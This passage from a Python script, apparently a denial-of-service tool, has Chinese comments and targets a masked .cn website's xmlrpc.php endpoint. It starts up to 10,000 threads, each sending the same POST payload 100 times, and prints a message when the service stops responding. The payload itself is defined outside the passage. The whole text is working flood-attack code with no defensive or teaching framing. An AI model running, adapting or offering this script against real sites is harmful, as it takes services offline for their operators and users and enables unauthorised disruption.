post_data = {
    "" : payload,
    }


class Thread(threading.Thread):
    def run(self):
        req = urllib.request.Request("http://***.***.cn/xmlrpc.php", data = urllib.parse.urlencode(post_data).encode("UTF-8"), method = "POST")
        print("[+] {} started!".format(self.getName()))
        for x in range(100):  #循环100次
            try:
                response = urllib.request.urlopen(req)
            except IOError: 
                print("[+] Service Unavaliable!\r\n")
                time.sleep(0.2)    											
            else:                                  		
                print("[+] {} finished!".format(self.getName()))            


if __name__ == "__main__":
    for x in range(10000):    #开启10000个线程                                   					
        thread = Thread(name = "Thread{}".format(x + 1))  		
        thread.start()                                   			
        time.sleep(0.1)

